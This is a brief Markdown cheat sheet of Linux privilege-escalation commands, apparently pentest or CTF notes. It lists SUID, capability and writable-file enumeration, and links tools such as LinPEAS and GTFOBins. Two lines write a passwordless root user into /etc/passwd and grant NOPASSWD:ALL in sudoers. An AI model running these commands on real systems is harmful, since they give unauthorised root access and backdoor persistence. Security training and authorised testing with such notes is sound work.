# Privilege Escalation

## Linux
- `getcap -r / 2>/dev/null`<br>
- `find / -perm -u=s -type f 2>/dev/null`<br>
    - harden: `chmod u-s /usr/bin/find`<br>
- `find -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`<br>
- `find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u`<br>
- `sudo -V` to check sudo version, which might be vulnerable.<br>
- `echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd`<br>
- `echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`<br>
- `groups`<br>
    - `docker` (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- `find / -type f -executable -group users 2>/dev/null`
    - To find a file that can be executed by a specific group.

https://gtfobins.github.io/<br>
<hr>

### Basic Linux enumeration
https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet

+ linpeas.sh<br>

**Get Privilege Escalation vectors:**<br>
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<br>
- LinEnum: https://github.com/rebootuser/LinEnum<br>
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester<br>
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration<br>
- Linux Priv Checker: https://github.com/linted/linuxprivchecker<br>

## Windows
